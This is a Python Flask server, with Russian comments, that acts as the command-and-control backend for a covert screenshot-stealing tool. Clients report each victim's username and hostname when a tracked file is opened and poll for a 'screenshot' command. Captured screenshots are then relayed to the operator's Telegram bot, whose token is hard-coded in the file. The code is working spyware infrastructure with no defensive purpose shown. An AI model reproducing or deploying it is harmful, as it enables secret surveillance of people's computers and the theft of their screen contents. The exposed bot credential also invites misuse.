"""
Сервер для Telegram Tracker - хостится на Render/Railway
"""
import os
import requests
from flask import Flask, request, jsonify, render_template_string

BOT_TOKEN = "8330400918:AAEdz5G_0TxzZK8CyKz6oaIvJFRrPr8pbMw"
CHAT_ID = "8330400918"

app = Flask(__name__)

# Хранилище подключенных клиентов
clients = {}

WEBAPP_HTML = '''
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Скриншот</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: var(--tg-theme-bg-color, #1a1a2e);
            color: var(--tg-theme-text-color, #fff);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container { text-align: center; max-width: 400px; width: 100%; }
        h1 { font-size: 24px; margin-bottom: 10px; }
        p { color: var(--tg-theme-hint-color, #888); margin-bottom: 30px; }
        .btn {
            background: var(--tg-theme-button-color, #3390ec);
            color: var(--tg-theme-button-text-color, #fff);
            border: none;
            padding: 16px 32px;
            font-size: 18px;
            border-radius: 12px;
            cursor: pointer;
            width: 100%;
            max-width: 300px;
            margin: 10px 0;
        }
        .btn:disabled { opacity: 0.5; }
        .status {
            margin-top: 20px;
            padding: 15px;
            border-radius: 10px;
        }
        .success { background: rgba(76,175,80,0.2); color: #4caf50; }
        .error { background: rgba(244,67,54,0.2); color: #f44336; }
        .clients { margin-top: 20px; text-align: left; }
        .client-item {
            background: rgba(255,255,255,0.1);
            padding: 10px;
            border-radius: 8px;
            margin: 5px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>📸 Управление</h1>
        <p>Активные клиенты</p>
        <div class="clients" id="clients"></div>
        <button class="btn" onclick="loadClients()">🔄 Обновить</button>
        <div class="status" id="status"></div>
    </div>
    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();
        
        async function loadClients() {
            const res = await fetch('/clients');
            const data = await res.json();
            const container = document.getElementById('clients');
            
            if (Object.keys(data).length === 0) {
                container.innerHTML = '<p>Нет активных клиентов</p>';
                return;
            }
            
            container.innerHTML = '';
            for (const [id, info] of Object.entries(data)) {
                container.innerHTML += `
                    <div class="client-item">
                        <b>${info.username}@${info.hostname}</b><br>
                        <small>${info.time}</small><br>
                        <button class="btn" style="padding:8px 16px;font-size:14px;margin-top:8px" 
                                onclick="requestScreenshot('${id}')">📷 Скриншот</button>
                    </div>
                `;
            }
        }
        
        async function requestScreenshot(clientId) {
            document.getElementById('status').className = 'status';
            document.getElementById('status').textContent = '⏳ Запрос отправлен...';
            
            const res = await fetch('/request_screenshot', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({client_id: clientId})
            });
            const data = await res.json();
            
            document.getElementById('status').className = 'status ' + (data.success ? 'success' : 'error');
            document.getElementById('status').textContent = data.message;
        }
        
        loadClients();
        setInterval(loadClients, 10000);
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(WEBAPP_HTML)

@app.route('/register', methods=['POST'])
def register_client():
    """Клиент регистрируется при запуске"""
    data = request.json
    client_id = data.get('client_id')
    clients[client_id] = {
        'username': data.get('username'),
        'hostname': data.get('hostname'),
        'time': data.get('time'),
        'screenshot_requested': False
    }
    
    # Отправляем уведомление
    send_notification(data)
    return jsonify({"success": True})

@app.route('/clients')
def get_clients():
    return jsonify(clients)

@app.route('/request_screenshot', methods=['POST'])
def request_screenshot():
    """Запрос скриншота от клиента"""
    data = request.json
    client_id = data.get('client_id')
    
    if client_id in clients:
        clients[client_id]['screenshot_requested'] = True
        return jsonify({"success": True, "message": "Запрос отправлен, ждите скриншот"})
    return jsonify({"success": False, "message": "Клиент не найден"})

@app.route('/check_command/<client_id>')
def check_command(client_id):
    """Клиент проверяет есть ли команда"""
    if client_id in clients and clients[client_id].get('screenshot_requested'):
        clients[client_id]['screenshot_requested'] = False
        return jsonify({"command": "screenshot"})
    return jsonify({"command": None})

@app.route('/upload_screenshot', methods=['POST'])
def upload_screenshot():
    """Клиент загружает скриншот"""
    if 'photo' not in request.files:
        return jsonify({"success": False})
    
    photo = request.files['photo']
    client_id = request.form.get('client_id', 'unknown')
    info = clients.get(client_id, {})
    
    caption = f"📸 Скриншот\n👤 {info.get('username', '?')}\n💻 {info.get('hostname', '?')}"
    
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    files = {'photo': photo}
    data = {'chat_id': CHAT_ID, 'caption': caption}
    
    response = requests.post(url, files=files, data=data)
    return jsonify({"success": response.status_code == 200})

def send_notification(data):
    """Отправить уведомление в Telegram"""
    message = f"🔔 Файл открыт!\n\n👤 Пользователь: {data.get('username')}\n💻 Компьютер: {data.get('hostname')}\n🕐 Время: {data.get('time')}"
    
    webapp_url = os.environ.get('WEBAPP_URL', request.host_url)
    keyboard = {
        "inline_keyboard": [[
            {"text": "📸 Открыть мини-приложение", "web_app": {"url": webapp_url}}
        ]]
    }
    
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(url, json={"chat_id": CHAT_ID, "text": message, "reply_markup": keyboard})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
